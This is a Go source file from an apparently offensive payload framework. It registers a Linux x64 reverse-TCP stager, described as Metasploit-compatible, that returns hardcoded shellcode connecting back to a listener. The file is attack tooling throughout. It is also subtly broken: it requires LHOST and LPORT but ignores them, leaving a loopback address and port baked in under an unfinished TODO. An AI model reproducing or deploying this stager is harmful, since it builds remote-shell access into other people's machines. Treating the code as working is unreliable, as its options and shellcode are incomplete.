// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2025 kdsmith18542

package stagers

import (
	"fmt"
	"github.com/kdsmith18542/pwny/internal/payload"
)

type LinuxX64TCP struct{}

func (g *LinuxX64TCP) Generate(opts payload.PayloadOptions) ([]byte, error) {
	if opts.LHOST == "" || opts.LPORT == 0 {
		return nil, fmt.Errorf("LHOST and LPORT are required")
	}

	// Metasploit-compatible linux/x64/meterpreter/reverse_tcp stager stub
	shellcode := []byte{
		0x6a, 0x29, 0x58, 0x99, 0x6a, 0x02, 0x5f, 0x6a, 0x01, 0x5e, 0x0f, 0x05, 0x48, 0x97, 0x48, 0xb9,
		0x02, 0x00, 0x11, 0x5c, 0x7f, 0x00, 0x00, 0x01, 0x51, 0x48, 0x89, 0xe6, 0x6a, 0x10, 0x5a, 0x6a,
		0x2a, 0x58, 0x0f, 0x05, 0x48, 0x85, 0xc0, 0x75, 0xec,
	}

	// TODO: Patch IP and Port into shellcode
	
	return shellcode, nil
}

func init() {
	payload.GlobalRegistry.RegisterStager("linux/x64/tcp", &LinuxX64TCP{})
}
